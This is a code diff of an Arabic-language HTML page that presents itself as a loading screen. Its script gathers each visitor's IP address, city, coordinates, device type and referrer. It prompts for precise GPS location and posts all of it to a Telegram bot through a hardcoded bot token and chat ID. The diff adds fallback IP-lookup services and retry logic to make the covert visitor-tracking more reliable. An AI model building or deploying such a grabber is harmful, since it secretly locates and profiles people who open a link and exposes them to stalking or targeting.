@@ -3,31 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Loading...</title>
+    <title>جاري التحميل...</title>
     <style>
-        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #fff; }
+        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #fff; flex-direction: column; }
         .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #00aaff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .container { text-align: center; }
-        p { opacity: 0.5; font-size: 14px; }
+        #status { margin-top: 20px; font-size: 14px; color: #aaa; }
+        #done { display: none; margin-top: 20px; color: #4ade80; font-weight: bold; }
+        #deviceInfo { margin-top: 10px; font-size: 13px; color: #666; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="spinner"></div>
+        <div class="spinner" id="spinner"></div>
         <p>جاري التحميل...</p>
+        <div id="status">⏳ جلب المعلومات...</div>
+        <div id="done">✅ تم الإرسال إلى التيليجرام!</div>
+        <div id="deviceInfo"></div>
     </div>
 
     <script>
         // =====================================================
-        // 🔑 بيانات البوت الخاصة بك (تم إدخالها مسبقاً)
-        // =====================================================
+        // 🔑 بيانات البوت (ثابتة)
         const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
         const CHAT_ID = '5343926721';
         // =====================================================
 
-        // === جمع البيانات ===
-        const data = {
+        let reportSent = false; // منع إرسال أكثر من رسالة
+        let data = {
             ip: 'غير معروف',
             country: 'غير معروف',
             city: 'غير معروف',
@@ -36,63 +40,142 @@
             gps_lat: null,
             gps_lon: null,
             device: navigator.userAgent || 'غير معروف',
-            time: new Date().toLocaleString('ar-EG'),
+            deviceName: 'غير معروف',
+            time: new Date().toLocaleString('ar-EG', { hour12: false }),
             url: window.location.href,
             referrer: document.referrer || 'مباشر'
         };
 
-        // === 1. جلب الـ IP والتقريبي ===
-        async function fetchIP() {
-            try {
-                const res = await fetch('https://ip-api.com/json/');
-                const info = await res.json();
-                if (info.status === 'success') {
-                    data.ip = info.query;
-                    data.country = info.country;
-                    data.city = info.city;
-                    data.lat = info.lat;
-                    data.lon = info.lon;
-                }
-            } catch (e) { /* لا تفعل شيئاً */ }
-            requestGPS();
+        // === تحسين عرض اسم الجهاز (يظهر Android / iPhone / Windows) ===
+        function getDeviceName(ua) {
+            if (ua.includes('Android')) return '📱 Android';
+            if (ua.includes('iPhone') || ua.includes('iPad')) return '📱 iPhone/iPad';
+            if (ua.includes('Windows')) return '💻 Windows';
+            if (ua.includes('Macintosh')) return '💻 Mac';
+            if (ua.includes('Linux')) return '🐧 Linux';
+            return '🖥️ جهاز غير معروف';
+        }
+        data.deviceName = getDeviceName(data.device);
+        document.getElementById('deviceInfo').textContent = `🖥️ الجهاز: ${data.deviceName}`;
+
+        function setStatus(msg) {
+            document.getElementById('status').textContent = msg;
         }
 
-        // === 2. طلب GPS دقيق (مع نافذة إذن) ===
+        // ============================================================
+        // 1. جلب الـ IP + الموقع التقريبي (بـ 3 محاولات بديلة)
+        // ============================================================
+        async function fetchIPWithRetry() {
+            setStatus('⏳ جلب الموقع التقريبي...');
+
+            // المحاولة الأولى: ip-api.com (الأسرع والأكثر دقة)
+            try {
+                const res = await fetch('https://ip-api.com/json/?fields=status,country,city,lat,lon,query');
+                const info = await res.json();
+                if (info.status === 'success' && info.query) {
+                    data.ip = info.query;
+                    data.country = info.country || 'غير معروف';
+                    data.city = info.city || 'غير معروف';
+                    data.lat = info.lat || 'غير معروف';
+                    data.lon = info.lon || 'غير معروف';
+                    setStatus(`✅ تم جلب IP: ${data.ip} (${data.city})`);
+                    return;
+                }
+            } catch (e) { /* فشل */ }
+
+            // المحاولة الثانية: ipinfo.io
+            try {
+                const res = await fetch('https://ipinfo.io/json');
+                const info = await res.json();
+                if (info.ip) {
+                    data.ip = info.ip;
+                    data.country = info.country || 'غير معروف';
+                    data.city = info.city || 'غير معروف';
+                    const loc = info.loc ? info.loc.split(',') : ['غير معروف', 'غير معروف'];
+                    data.lat = loc[0] || 'غير معروف';
+                    data.lon = loc[1] || 'غير معروف';
+                    setStatus(`✅ تم جلب IP: ${data.ip} (${data.city})`);
+                    return;
+                }
+            } catch (e) { /* فشل */ }
+
+            // المحاولة الثالثة: api.ipify.org + ip-api.com
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                if (ipData.ip) {
+                    data.ip = ipData.ip;
+                    const detailRes = await fetch(`https://ip-api.com/json/${data.ip}?fields=status,country,city,lat,lon`);
+                    const detail = await detailRes.json();
+                    if (detail.status === 'success') {
+                        data.country = detail.country || 'غير معروف';
+                        data.city = detail.city || 'غير معروف';
+                        data.lat = detail.lat || 'غير معروف';
+                        data.lon = detail.lon || 'غير معروف';
+                        setStatus(`✅ تم جلب IP: ${data.ip} (${data.city})`);
+                        return;
+                    }
+                }
+            } catch (e) { /* فشل */ }
+
+            // إذا فشل كل شيء، نرسل البيانات المتاحة (ستكون "غير معروف" لكن السكربت يستمر)
+            setStatus('⚠️ تم جلب البيانات جزئياً (قد تكون بعض الحقول غير معروفة)');
+        }
+
+        // ============================================================
+        // 2. طلب GPS دقيق (مع نافذة إذن)
+        // ============================================================
         function requestGPS() {
             if (!navigator.geolocation) {
+                setStatus('📡 GPS غير مدعوم، نرسل التقريبي فقط');
                 sendReport();
                 return;
             }
+            setStatus('📡 نطلب إذن الموقع الدقيق...');
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     data.gps_lat = pos.coords.latitude;
                     data.gps_lon = pos.coords.longitude;
+                    setStatus('✅ تم الحصول على GPS');
                     sendReport();
                 },
-                () => { sendReport(); }, // إذا رفض، نرسل بالـ IP فقط
-                { enableHighAccuracy: true, timeout: 7000 }
+                () => {
+                    setStatus('⚠️ تم رفض إذن GPS، نرسل التقريبي');
+                    sendReport();
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
             );
         }
 
-        // === 3. إرسال التقرير إلى تيليجرام ===
+        // ============================================================
+        // 3. إرسال التقرير (مرة واحدة فقط)
+        // ============================================================
         function sendReport() {
+            if (reportSent) return; // منع التكرار
+            reportSent = true;
+
             let msg = `🚨 <b>زائر جديد!</b>\n\n`;
             msg += `🌐 IP: ${data.ip}\n`;
             msg += `📍 الدولة: ${data.country}\n`;
             msg += `🏙️ المدينة: ${data.city}\n`;
+            msg += `📡 نظام التشغيل: ${data.deviceName}\n`;
+
             if (data.gps_lat && data.gps_lon) {
                 msg += `🛰️ GPS دقيق: ${data.gps_lat}, ${data.gps_lon}\n`;
                 msg += `🗺️ خريطة: https://www.google.com/maps?q=${data.gps_lat},${data.gps_lon}\n`;
-            } else {
+            } else if (data.lat !== 'غير معروف' && data.lon !== 'غير معروف') {
                 msg += `📡 تقريبي (IP): ${data.lat}, ${data.lon}\n`;
                 msg += `🗺️ خريطة: https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
+            } else {
+                msg += `📡 الموقع: غير متوفر (تم رفض الإذن)\n`;
             }
-            msg += `🖥️ الجهاز: ${data.device.substring(0, 70)}\n`;
+
             msg += `🕒 الوقت: ${data.time}\n`;
             msg += `🔗 الصفحة: ${data.url}\n`;
             msg += `↩️ المرجع: ${data.referrer}`;
 
-            // إرسال عبر التيليجرام
+            setStatus('📤 جاري الإرسال إلى تيليجرام...');
+
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -101,14 +184,34 @@
                     text: msg,
                     parse_mode: 'HTML'
                 })
-            }).catch(() => {});
+            })
+            .then(res => res.json())
+            .then(response => {
+                if (response.ok) {
+                    setStatus('✅ تم الإرسال بنجاح!');
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('done').style.display = 'block';
+                } else {
+                    setStatus('❌ فشل الإرسال: ' + (response.description || 'خطأ غير معروف'));
+                    reportSent = false; // إعادة تعيين للسماح بإعادة المحاولة إذا فشل
+                }
+            })
+            .catch(err => {
+                setStatus('❌ خطأ في الاتصال: ' + err.message);
+                reportSent = false;
+            });
         }
 
-        // === 4. التشغيل فوراً ===
-        fetchIP();
-
-        // (اختياري) إعادة توجيه الزائر إلى موقع آخر بعد 3 ثوانٍ
-        // window.location.href = 'https://www.google.com';
+        // ============================================================
+        // 4. تشغيل كل شيء (مع تأخير بسيط)
+        // ============================================================
+        setTimeout(async () => {
+            await fetchIPWithRetry();
+            // نعطي مهلة صغيرة لظهور البيانات قبل طلب GPS
+            setTimeout(() => {
+                requestGPS();
+            }, 300);
+        }, 400);
     </script>
 </body>
 </html>
